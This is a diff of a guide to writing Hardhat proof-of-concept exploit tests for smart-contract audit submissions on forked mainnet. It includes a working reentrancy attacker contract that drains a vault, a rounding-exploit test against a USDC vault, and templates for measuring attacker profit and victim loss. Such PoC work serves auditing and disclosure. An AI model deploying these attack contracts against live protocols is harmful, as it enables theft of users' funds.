@@ -10,17 +10,75 @@ Exploit: Deposit 100, withdraw 1000
 
 ## Quick Decision: What Type of Bug?
 
-Before writing code, answer one question:
+Before writing code, walk through this decision tree:
 
-**Does the attacker extract value (tokens/ETH)?**
-- **Yes** → Use **Template 1: Value Extraction** (most common)
-- **No** → Use **Template 2: Invariant Break** (unauthorized execution)
+```
+1. Does the attacker extract value (tokens/ETH)?
+   ├─ YES → Template 1 (Value Extraction)
+   │   ├─ Direct theft (withdraw more than deposited)
+   │   ├─ Price manipulation (oracle, AMM sandwich)
+   │   ├─ Flash loan profit
+   │   └─ Fee/reward abuse
+   │
+   └─ NO → Does the attacker cause permanent harm without extracting funds?
+       ├─ YES → Template 2 (Invariant Break)
+       │   ├─ Access control bypass (call admin/restricted functions)
+       │   ├─ Forced liquidation of solvent positions
+       │   ├─ Permanent DoS / griefing (freeze withdrawals, block upgrades)
+       │   ├─ Fund locking (user cannot withdraw forever)
+       │   ├─ State corruption (break storage invariants, poison oracles)
+       │   └─ Governance hijack (pass unauthorized proposals)
+       │
+       └─ NO → Not a vulnerability (or needs stronger impact argument)
+```
+
+**Edge cases:**
+- **Fund locking** (users can't withdraw): Use Template 2 — the invariant is "users can always withdraw their own funds."
+- **Cross-chain bugs**: Use Template 1 or 2 on the affected chain. Fork the chain where the exploit matters.
+- **DoS that costs the attacker money**: Use Template 1 if the victim's loss exceeds attacker's cost; otherwise Template 2.
+- **Governance manipulation**: Use Template 2. The invariant is the governance threshold / timelock / quorum that was bypassed.
 
 ---
 
 ## Setup: Hardhat Configuration
 
-### `hardhat.config.js`
+### Hardhat 3 (recommended) — `hardhat.config.ts`
+
+```typescript
+import { configVariable, defineConfig } from "hardhat/config";
+import hardhatToolboxViem from "@nomicfoundation/hardhat-toolbox-viem";
+
+export default defineConfig({
+  plugins: [hardhatToolboxViem],
+  solidity: {
+    version: "0.8.28",
+    settings: {
+      optimizer: { enabled: true, runs: 200 },
+    },
+  },
+  networks: {
+    mainnetFork: {
+      type: "edr-simulated",
+      chainType: "l1",
+      forking: {
+        url: configVariable("MAINNET_RPC_URL"),
+        blockNumber: 19_500_000, // Pin for deterministic results + caching
+      },
+    },
+  },
+  test: {
+    mocha: {
+      timeout: 600_000, // 10 minutes for fork tests
+    },
+  },
+});
+```
+
+> **Hardhat 3 note:** Use `configVariable("KEY")` instead of `process.env.KEY`.
+> Values are resolved lazily — only fetched when the network is actually used.
+> Store secrets with `npx hardhat keystore set MAINNET_RPC_URL` for encryption.
+
+### Hardhat 2 (legacy) — `hardhat.config.js`
 
 ```javascript
 require("@nomicfoundation/hardhat-toolbox");
@@ -30,30 +88,25 @@ module.exports = {
   solidity: {
     version: "0.8.20",
     settings: {
-      optimizer: {
-        enabled: true,
-        runs: 200
-      }
-    }
+      optimizer: { enabled: true, runs: 200 },
+    },
   },
   networks: {
     hardhat: {
       forking: {
         url: process.env.MAINNET_RPC_URL,
-        blockNumber: 19_500_000,  // Use recent stable block
-        enabled: true
+        blockNumber: 19_500_000,
+        enabled: true,
       },
-      gasPrice: 50000000000,  // 50 gwei
-      initialBaseFeePerGas: 1000000000
-    }
+    },
   },
   mocha: {
-    timeout: 600000  // 10 minutes for fork tests
-  }
+    timeout: 600_000,
+  },
 };
 ```
 
-### `.env`
+### `.env` (for Hardhat 2, or as env var fallback for Hardhat 3)
 
 ```bash
 MAINNET_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY_HERE
@@ -79,10 +132,17 @@ describe("Exploit: [Vulnerability Name]", function () {
   // Mainnet addresses (replace with actual)
   const VULNERABLE_CONTRACT = "0x...";
   const UNDERLYING_TOKEN = "0x...";
-  const TOKEN_WHALE = "0x...";  // Find on Etherscan
+  const TOKEN_WHALE = "0x...";  // Find on Etherscan (top holder)
   
   // Test accounts
   const ATTACKER = "0x0000000000000000000000000000000000001337";
+  
+  // Set the victim to whoever actually loses funds in the exploit.
+  // Common choices:
+  //   VULNERABLE_CONTRACT  — the protocol vault / pool itself
+  //   "0xRealUserAddr"     — a specific on-chain user (LP, depositor)
+  // For fork tests, pick the real address that holds the funds at risk.
+  const VICTIM = VULNERABLE_CONTRACT;
   
   // Economic parameters
   const INITIAL_TOKENS = ethers.parseUnits("10000", 18);
@@ -92,8 +152,9 @@ describe("Exploit: [Vulnerability Name]", function () {
   let vulnerable, token;
   let attacker;
   
-  // State tracking
-  let attackerTokenBefore, vaultTokenBefore;
+  // State tracking — populated in before(), checked after exploit
+  let attackerTokenBefore, victimTokenBefore;
+  let attackerEthBefore, victimEthBefore;
   
   // ═══════════════════════════════════════════════════════════
   // SETUP
@@ -154,12 +215,14 @@ describe("Exploit: [Vulnerability Name]", function () {
       params: [TOKEN_WHALE]
     });
     
-    // Record initial balances
+    // Record initial balances (AFTER seed funding, BEFORE exploit)
     attackerTokenBefore = await token.balanceOf(ATTACKER);
-    vaultTokenBefore = await token.balanceOf(VULNERABLE_CONTRACT);
+    victimTokenBefore = await token.balanceOf(VICTIM);
+    attackerEthBefore = await ethers.provider.getBalance(ATTACKER);
+    victimEthBefore = await ethers.provider.getBalance(VICTIM);
     
     console.log("Attacker balance:", ethers.formatUnits(attackerTokenBefore, 18));
-    console.log("Vault balance:", ethers.formatUnits(vaultTokenBefore, 18));
+    console.log("Victim balance:", ethers.formatUnits(victimTokenBefore, 18));
   });
   
   // ═══════════════════════════════════════════════════════════
@@ -186,18 +249,28 @@ describe("Exploit: [Vulnerability Name]", function () {
     
     // Verify impact
     const attackerTokenAfter = await token.balanceOf(ATTACKER);
-    const vaultTokenAfter = await token.balanceOf(VULNERABLE_CONTRACT);
+    const victimTokenAfter = await token.balanceOf(VICTIM);
     
     const profit = attackerTokenAfter - attackerTokenBefore;
-    const loss = vaultTokenBefore - vaultTokenAfter;
+    const loss = victimTokenBefore - victimTokenAfter;
     
     console.log("\n=== Results ===");
     console.log("Attacker profit:", ethers.formatUnits(profit, 18));
-    console.log("Vault loss:", ethers.formatUnits(loss, 18));
+    console.log("Victim loss:", ethers.formatUnits(loss, 18));
+    
+    // ETH tracking (for exploits that also extract native ETH)
+    const attackerEthAfter = await ethers.provider.getBalance(ATTACKER);
+    const victimEthAfter = await ethers.provider.getBalance(VICTIM);
+    const ethProfit = attackerEthAfter - attackerEthBefore;
+    const ethLoss = victimEthBefore - victimEthAfter;
+    if (ethProfit > 0n || ethLoss > 0n) {
+      console.log("ETH profit:", ethers.formatEther(ethProfit));
+      console.log("ETH loss:",   ethers.formatEther(ethLoss));
+    }
     
     // Assertions
     expect(profit).to.be.gt(0, "Attacker should profit");
-    expect(loss).to.be.gt(0, "Vault should lose funds");
+    expect(loss).to.be.gt(0, "Victim should lose funds");
   });
 });
 ```
@@ -286,22 +359,27 @@ describe("Invariant Break: [Vulnerability Name]", function () {
     console.log("\n=== Testing Invariant ===");
     console.log("RULE: Only insolvent positions can be liquidated");
     
-    // Verify victim is solvent (should be protected)
+    // PRE-CONDITION: Verify the invariant holds BEFORE the attack
     const isSolventBefore = await vulnerable.isSolvent(VICTIM);
     expect(isSolventBefore).to.be.true;
+    console.log("Invariant holds BEFORE attack: true");
     
     console.log("\n=== Executing unauthorized liquidation ===");
     
     // This should fail but won't due to bug
     await vulnerable.connect(attacker).liquidate(VICTIM);
     
-    // Verify invariant was broken
-    const wasLiquidated = !(await vulnerable.isSolvent(VICTIM));
+    // POST-CONDITION: Verify the invariant is now BROKEN
+    const isSolventAfter = await vulnerable.isSolvent(VICTIM);
     
     console.log("\n=== Results ===");
-    console.log("Liquidation executed:", wasLiquidated);
+    console.log("Invariant holds AFTER  attack:", isSolventAfter ? "true (BUG NOT TRIGGERED)" : "FALSE — BROKEN");
     
-    expect(wasLiquidated).to.be.true;
+    // Measure downstream impact if applicable
+    // const penalty = await vulnerable.calculateLiquidationPenalty(VICTIM);
+    // console.log("Liquidation penalty (wei):", penalty.toString());
+    
+    expect(isSolventAfter).to.be.false;
   });
 });
 ```
@@ -313,18 +391,18 @@ describe("Invariant Break: [Vulnerability Name]", function () {
 ### Pattern 1: Impersonate Account
 
 ```javascript
-// Impersonate any address
+// Modern approach (preferred) — one step, auto-funded
+const signer = await ethers.getImpersonatedSigner(address);
+await token.connect(signer).transfer(recipient, amount);
+// No need to stop impersonation — getImpersonatedSigner handles it.
+
+// Manual approach (if you need fine-grained control)
 await network.provider.request({
   method: "hardhat_impersonateAccount",
   params: [address]
 });
-
-const signer = await ethers.getSigner(address);
-
-// Use it
-await token.connect(signer).transfer(recipient, amount);
-
-// Stop impersonation
+const manualSigner = await ethers.getSigner(address);
+await token.connect(manualSigner).transfer(recipient, amount);
 await network.provider.request({
   method: "hardhat_stopImpersonatingAccount",
   params: [address]
@@ -341,15 +419,22 @@ await network.provider.send("hardhat_setBalance", [
 ]);
 ```
 
-### Pattern 3: Time Manipulation
+### Pattern 3: Time & Block Manipulation
 
 ```javascript
-// Advance time by 1 day
+// Advance time by 1 day AND advance block number
 const block = await ethers.provider.getBlock("latest");
 await network.provider.send("evm_setNextBlockTimestamp", [
   block.timestamp + 86400
 ]);
 await network.provider.send("evm_mine");
+
+// Bulk-advance many blocks at once (much faster than calling evm_mine in a loop)
+// Mine 100 blocks with 12-second intervals:
+await network.provider.send("hardhat_mine", [
+  "0x64",  // 100 blocks (hex)
+  "0xc"    // 12 seconds between each (hex)
+]);
 ```
 
 ### Pattern 4: Gas Tracking
@@ -362,7 +447,14 @@ console.log("Gas used:", receipt.gasUsed.toString());
 console.log("Gas price:", receipt.gasPrice.toString());
 
 const gasCost = receipt.gasUsed * receipt.gasPrice;
-console.log("ETH spent:", ethers.formatEther(gasCost));
+console.log("ETH spent on gas:", ethers.formatEther(gasCost));
+
+// Full EVM trace (opcode-level) for deep debugging:
+const trace = await network.provider.request({
+  method: "debug_traceTransaction",
+  params: [receipt.hash]
+});
+console.log("Trace steps:", trace.structLogs.length);
 ```
 
 ### Pattern 5: Multi-Transaction Attack
@@ -371,52 +463,161 @@ console.log("ETH spent:", ethers.formatEther(gasCost));
 // Transaction 1
 await vulnerable.connect(attacker).setupAttack();
 
-// Mine a block
+// Advance block + timestamp (simulate real block production)
+await network.provider.send("evm_setNextBlockTimestamp", [
+  (await ethers.provider.getBlock("latest")).timestamp + 12
+]);
 await network.provider.send("evm_mine");
 
 // Transaction 2
 await vulnerable.connect(attacker).executeAttack();
 
-// Mine another block
+// Advance again
+await network.provider.send("evm_setNextBlockTimestamp", [
+  (await ethers.provider.getBlock("latest")).timestamp + 12
+]);
 await network.provider.send("evm_mine");
 
 // Transaction 3
 await vulnerable.connect(attacker).extractProfit();
 ```
 
+### Pattern 6: Reentrancy Attack
+
+Reentrancy requires a malicious contract with a callback. Deploy it in the test:
+
+```javascript
+// In your test's before():
+const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
+const attackContract = await ReentrancyAttacker.deploy(VULNERABLE_CONTRACT);
+
+// In your test:
+it("reenters withdraw to drain vault", async function () {
+  const vaultBefore = await ethers.provider.getBalance(VULNERABLE_CONTRACT);
+  
+  // Fund the attack contract, deposit, then trigger reentrancy
+  await attackContract.attack({ value: ethers.parseEther("1") });
+  
+  const vaultAfter = await ethers.provider.getBalance(VULNERABLE_CONTRACT);
+  console.log("Vault drained:", ethers.formatEther(vaultBefore - vaultAfter));
+  expect(vaultAfter).to.be.lt(vaultBefore);
+});
+```
+
+The attack contract (deploy alongside your test):
+
+```solidity
+// contracts/test/ReentrancyAttacker.sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+interface IVulnerable {
+    function deposit() external payable;
+    function withdraw(uint256) external;
+}
+
+contract ReentrancyAttacker {
+    IVulnerable target;
+    uint256 count;
+
+    constructor(address _target) { target = IVulnerable(_target); }
+
+    function attack() external payable {
+        target.deposit{value: msg.value}();
+        target.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        if (count < 5 && address(target).balance > 0) {
+            count++;
+            target.withdraw(msg.value);
+        }
+    }
+}
+```
+
+### Pattern 7: State Snapshot & Revert
+
+Use `evm_snapshot` / `evm_revert` to checkpoint and reset state between exploit phases:
+
+```javascript
+// Take a snapshot before the exploit
+const snapshotId = await network.provider.send("evm_snapshot");
+
+// Run exploit attempt #1
+await vulnerable.connect(attacker).exploit();
+
+// Revert to pre-exploit state (snapshot can only be reverted ONCE)
+await network.provider.send("evm_revert", [snapshotId]);
+
+// Take a fresh snapshot if you need to revert again
+const snapshotId2 = await network.provider.send("evm_snapshot");
+
+// Run exploit attempt #2 with different parameters
+await vulnerable.connect(attacker).exploitAlternative();
+```
+
 ---
 
 ## Running Your Tests
 
-### Basic Run
+### Hardhat 3
 
 ```bash
+# Run all tests on default network
+npx hardhat test nodejs
+
+# Run on a specific forked network (defined in hardhat.config.ts)
+npx hardhat test nodejs --network mainnetFork
+
+# Run a specific test file
+npx hardhat test nodejs test/Exploit.test.ts
+
+# Run Solidity tests (Forge-compatible .t.sol files)
+npx hardhat test solidity
+
+# Gas statistics for all contract functions
+npx hardhat test nodejs --gas-stats
+
+# Code coverage
+npx hardhat test nodejs --coverage
+```
+
+### Hardhat 2
+
+```bash
+# Basic run
 npx hardhat test
-```
 
-### Specific Test
-
-```bash
+# Specific test by grep
 npx hardhat test --grep "exploits vulnerability"
-```
 
-### With Console Logs
-
-```bash
+# With verbose logging (shows console.log output)
 npx hardhat test --verbose
 ```
 
-### With Gas Report
+### With Gas Report (Hardhat 2)
 
 ```bash
-# Install gas reporter first
+# Install gas reporter
 npm install --save-dev hardhat-gas-reporter
 
 # Add to hardhat.config.js:
-require("hardhat-gas-reporter");
+# require("hardhat-gas-reporter");
 
-# Then run
 npx hardhat test
+```
+
+### Debug Logging
+
+For deep Hardhat internals debugging:
+
+```bash
+# Show all debug logs
+DEBUG='hardhat*' npx hardhat test nodejs
+
+# Filter to just Solidity-related logs
+DEBUG='hardhat:core:solidity:*' npx hardhat test nodejs
 ```
 
 ---
@@ -425,42 +626,55 @@ npx hardhat test
 
 ### ✅ DO:
 
-1. **Fork mainnet** - Use real deployed contracts
-2. **Use impersonateAccount** - For whale tokens or testing different roles
+1. **Fork mainnet** - Use real deployed contracts at a pinned block
+2. **Use `getImpersonatedSigner()`** - For whale tokens or testing different roles
 3. **Minimal ABIs** - Only include functions you actually call
-4. **Show the numbers** - Log balances before/after
-5. **Realistic gas** - Use 50+ gwei gas price
+4. **Show the numbers** - Log balances before/after with `ethers.formatUnits()`
+5. **Pin the fork block** - For deterministic results and caching
+6. **Use `configVariable()` (HH3)** - Never hardcode RPC URLs or API keys
 
 ### ❌ DON'T:
 
-1. **Don't use `hardhat_setStorageAt` on target** - Can't modify deployed contract storage
-2. **Don't mock in-scope contracts** - Test the real thing
-3. **Don't use unrealistic amounts** - Keep values reasonable
+1. **Don't use `hardhat_setStorageAt` on target** - Modifying the audited contract's storage invalidates the PoC
+2. **Don't mock in-scope contracts** - Test the real thing on a fork
+3. **Don't use unrealistic amounts** - Keep token amounts reasonable
 4. **Don't skip setup steps** - Show the full attack path
+5. **Don't give attacker special powers** - No admin roles, no direct storage writes on target
+6. **Don't forget timestamps** - When using `evm_mine`, also advance `evm_setNextBlockTimestamp`
 
 ### Special Case: When `hardhat_setStorageAt` Is OK
 
-Only to model **historical state** that could have existed:
+`hardhat_setStorageAt` is acceptable **only on out-of-scope / external dependency contracts** — never on the contract you are proving is vulnerable. If you set storage on the target, a judge can dismiss the PoC as fabricated state.
+
+**Allowed uses:**
+- Setting state on an **oracle** or **price feed** to model a historical price
+- Setting state on an **external dependency** that could have reached that state through normal usage
+- Setting a **non-target** contract's storage to recreate conditions that existed at a past block
+
+**Never allowed:**
+- `hardhat_setStorageAt` on the `VULNERABLE_CONTRACT` address — this invalidates the PoC
 
 ```javascript
-// ✅ ACCEPTABLE: Simulating old checkpoint that wasn't revalidated
-const oldCheckpoint = Math.floor(Date.now() / 1000) - (30 * 24 * 60 * 60); // 30 days ago
-
-// Get storage slot for checkpoint
-const slot = ethers.solidityPackedKeccak256(
-  ["uint256", "uint256"],
-  [5, 0]  // slot 5 in storage
-);
+// ✅ ACCEPTABLE: Set state on an OUT-OF-SCOPE oracle to model a past price
+const ORACLE = "0x..."; // External price feed, NOT the target
+const stalePrice = 1500n * 10n ** 8n; // $1500, 8 decimals
 
 await network.provider.send("hardhat_setStorageAt", [
-  VULNERABLE_CONTRACT,
-  slot,
-  ethers.zeroPadValue(ethers.toBeHex(oldCheckpoint), 32)
+  ORACLE,           // ← NOT VULNERABLE_CONTRACT
+  "0x0",            // price slot
+  ethers.zeroPadValue(ethers.toBeHex(stalePrice), 32)
 ]);
 
-// Now show the bug: protocol doesn't revalidate
-await vulnerable.connect(attacker).useCheckpoint();
+// Now show the bug: the TARGET doesn't revalidate the stale oracle
+await vulnerable.connect(attacker).borrow(ethers.parseEther("1000"));
+
+// ❌ NEVER: hardhat_setStorageAt on the TARGET contract
+// This INVALIDATES the PoC:
+// await network.provider.send("hardhat_setStorageAt", [VULNERABLE_CONTRACT, ...]);
 ```
+
+> **Tip:** Prefer forking at a block where the precondition already exists
+> naturally, so you don't need `hardhat_setStorageAt` at all.
 
 ---
 
@@ -471,21 +685,23 @@ const { expect } = require("chai");
 const { ethers, network } = require("hardhat");
 
 describe("Rounding Exploit in Vault", function () {
-  const VAULT = "0x123...";  // Real vault address
-  const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-  const WHALE = "0xabc...";  // Top USDC holder
-  const ATTACKER = "0x1337...";
+  // ── Addresses ────────────────────────────────────────────
+  const VAULT   = "0x123...";  // Real vault address (target contract)
+  const USDC    = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+  const WHALE   = "0xabc...";  // Top USDC holder (funding source)
+  const ATTACKER = "0x1337...";  // Fresh EOA
+  const VICTIM  = VAULT;  // Vault itself loses tokens
   
   let vault, usdc, attacker;
   
   before(async function () {
-    // Fork mainnet
+    // Fork mainnet at a pinned block for reproducibility
     await network.provider.request({
       method: "hardhat_reset",
       params: [{
         forking: {
           jsonRpcUrl: process.env.MAINNET_RPC_URL,
-          blockNumber: 19_500_000
+          blockNumber: 19_500_000  // Always pin!
         }
       }]
     });
@@ -503,21 +719,16 @@ describe("Rounding Exploit in Vault", function () {
       "function transfer(address, uint256) returns (bool)"
     ], USDC);
     
-    // Setup attacker
+    // Setup attacker — fund gas only, no special privileges
     await network.provider.send("hardhat_setBalance", [
       ATTACKER,
-      ethers.parseEther("10").toString(16)
+      "0x" + ethers.parseEther("10").toString(16)
     ]);
     
     attacker = await ethers.getImpersonatedSigner(ATTACKER);
     
-    // Get USDC from whale
-    await network.provider.request({
-      method: "hardhat_impersonateAccount",
-      params: [WHALE]
-    });
-    
-    const whale = await ethers.getSigner(WHALE);
+    // Get USDC from whale (funding source — not the victim)
+    const whale = await ethers.getImpersonatedSigner(WHALE);
     const amount = ethers.parseUnits("1000000", 6);  // $1M USDC
     await usdc.connect(whale).transfer(ATTACKER, amount);
     
@@ -528,11 +739,16 @@ describe("Rounding Exploit in Vault", function () {
   });
   
   it("exploits rounding error to profit", async function () {
-    const vaultBefore = await usdc.balanceOf(VAULT);
+    // ── Snapshot BEFORE state ──────────────────────────────
+    const victimTokenBefore  = await usdc.balanceOf(VICTIM);
+    const attackerTokenBefore = await usdc.balanceOf(ATTACKER);
+    const attackerEthBefore  = await ethers.provider.getBalance(ATTACKER);
     
-    console.log("Vault balance:", ethers.formatUnits(vaultBefore, 6), "USDC");
+    console.log("--- BEFORE ---");
+    console.log("Victim USDC :", ethers.formatUnits(victimTokenBefore, 6));
+    console.log("Attacker USDC:", ethers.formatUnits(attackerTokenBefore, 6));
     
-    // Exploit: Large deposit then withdraw with rounding in attacker's favor
+    // ── Execute exploit ────────────────────────────────────
     const depositAmount = ethers.parseUnits("1000000", 6);
     
     await usdc.connect(attacker).approve(VAULT, ethers.MaxUint256);
@@ -542,31 +758,66 @@ describe("Rounding Exploit in Vault", function () {
     const maxWithdraw = await vault.maxWithdraw(ATTACKER);
     await vault.connect(attacker).withdraw(maxWithdraw - 1n, ATTACKER, ATTACKER);
     
-    const vaultAfter = await usdc.balanceOf(VAULT);
-    const attackerProfit = await usdc.balanceOf(ATTACKER);
+    // ── Snapshot AFTER state ───────────────────────────────
+    const victimTokenAfter   = await usdc.balanceOf(VICTIM);
+    const attackerTokenAfter = await usdc.balanceOf(ATTACKER);
+    const attackerEthAfter   = await ethers.provider.getBalance(ATTACKER);
     
-    console.log("Vault balance:", ethers.formatUnits(vaultAfter, 6), "USDC");
-    console.log("Attacker profit:", ethers.formatUnits(attackerProfit - depositAmount, 6), "USDC");
+    // ── Report ─────────────────────────────────────────────
+    const attackerProfit = attackerTokenAfter - attackerTokenBefore;
+    const victimLoss     = victimTokenBefore - victimTokenAfter;
+    const gasCost        = attackerEthBefore - attackerEthAfter;
     
-    expect(vaultAfter).to.be.lt(vaultBefore);
-    expect(attackerProfit).to.be.gt(depositAmount);
+    console.log("--- AFTER ---");
+    console.log("Victim USDC :", ethers.formatUnits(victimTokenAfter, 6));
+    console.log("Attacker USDC:", ethers.formatUnits(attackerTokenAfter, 6));
+    console.log("--- RESULT ---");
+    console.log("Attacker profit:", ethers.formatUnits(attackerProfit, 6), "USDC");
+    console.log("Victim loss    :", ethers.formatUnits(victimLoss, 6), "USDC");
+    console.log("Gas cost       :", ethers.formatEther(gasCost), "ETH");
+    
+    // ── Assert ─────────────────────────────────────────────
+    expect(attackerProfit).to.be.gt(0n, "Attacker must profit");
+    expect(victimLoss).to.be.gt(0n, "Victim must lose funds");
+    expect(attackerProfit).to.be.gt(gasCost, "Profit must exceed gas");
   });
 });
 ```
 
 ---
 
+## Pre-Submission Checklist
+
+- [ ] **Fork block pinned** — `blockNumber` is hardcoded, not `"latest"`
+- [ ] **Victim identified** — `VICTIM` constant is set; before/after snapshots logged
+- [ ] **No target contract storage writes** — `hardhat_setStorageAt` / `vm.store` only on out-of-scope helpers
+- [ ] **Attacker has no special powers** — funded with ETH for gas only, no admin roles
+- [ ] **Profit exceeds gas** — `attackerProfit > gasCost` asserted
+- [ ] **Assertions present** — `expect()` calls prove the exploit worked
+- [ ] **Reproducible** — another engineer can run `npx hardhat test` and see the same result
+- [ ] **No stale env vars** — using `configVariable()` (HH3) or `.env` + `dotenv` (HH2)
+
+---
+
 ## Summary
 
-**For most bugs:** Use **Template 1 (Value Extraction)**  
-**For access control/invariant bugs:** Use **Template 2 (Invariant Break)**
+| Template | When to use |
+|----------|-------------|
+| **Template 1 — Value Extraction** | Theft, price manipulation, fee abuse, flash-loan exploits |
+| **Template 2 — Invariant Break** | Access-control bypass, state corruption, governance hijack |
 
-**Keep it simple:**
-1. Fork mainnet
-2. Setup attacker with `impersonateAccount`
-3. Execute the exploit
-4. Verify with assertions
+### Pattern cheat-sheet
 
-**The PoC should answer:** "Can an attacker with no special privileges exploit this on mainnet?"
+| # | Pattern | Key API |
+|---|---------|--------|
+| 1 | Impersonate whale / EOA | `getImpersonatedSigner()` |
+| 2 | Fund attacker | `hardhat_setBalance` |
+| 3 | Time & block manipulation | `evm_setNextBlockTimestamp`, `hardhat_mine` |
+| 4 | Gas tracking | `debug_traceTransaction`, `--gas-stats` |
+| 5 | Multi-transaction | Separate `it()` blocks + `evm_mine` |
+| 6 | Reentrancy | Deploy `ReentrancyAttacker.sol` + JS test |
+| 7 | Snapshot / Revert | `evm_snapshot`, `evm_revert` |
 
-If yes, you've written a good PoC.
+**The PoC must answer:** *"Can an attacker with no special privileges exploit this on mainnet?"*
+
+If the test passes, the answer is **yes** — and you've written a good PoC.
